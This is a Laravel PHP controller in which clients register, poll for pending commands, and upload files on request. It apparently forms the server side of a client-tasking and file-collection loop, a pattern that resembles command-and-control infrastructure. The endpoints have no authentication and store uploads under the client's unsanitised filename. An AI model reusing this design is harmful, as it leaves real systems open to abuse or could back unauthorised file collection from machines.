<?php

namespace App\Http\Controllers;

use App\Models\Client;
use Illuminate\Http\Request;

class ClientController extends Controller
{
    public function register(Request $request)
    {
        $client = Client::updateOrCreate(
            ['client_id' => $request->client_id],
            ['last_seen' => now()]
        );

        return response()->json([
            'message' => 'registered',
            'client' => $client
        ]);
    }

    public function checkCommand(Request $request)
    {
        $client = Client::where('client_id', $request->client_id)->first();

        if (!$client) {
            return response()->json(['error' => 'Client not found'], 404);
        }

        $client->last_seen = now();
        $client->save();

        $command = $client->pending_command ?? 'none';

        if ($client->pending_command) {
            $client->pending_command = null;
            $client->save();
        }

        return response()->json([
            'command' => $command
        ]);
    }

    public function requestDownload(Request $request)
    {
        $client = Client::where('client_id', $request->client_id)->first();

        if (!$client) {
            return response()->json(['error' => 'Client not found'], 404);
        }

        $client->pending_command = 'upload_file';
        $client->save();

        return response()->json([
            'message' => 'Download requested',
            'client_id' => $client->client_id
        ]);
    }

    public function uploadFile(Request $request)
    {
        $clientId = $request->client_id;

        if (!$request->hasFile('file')) {
            return response()->json(['error' => 'No file received'], 400);
        }

        $file = $request->file('file');
        $filename = $clientId . '_' . now()->format('Ymd_His') . '_' . $file->getClientOriginalName();

        $file->storeAs('downloads', $filename);

        return response()->json([
            'message' => 'File received',
            'filename' => $filename
        ]);
    }
}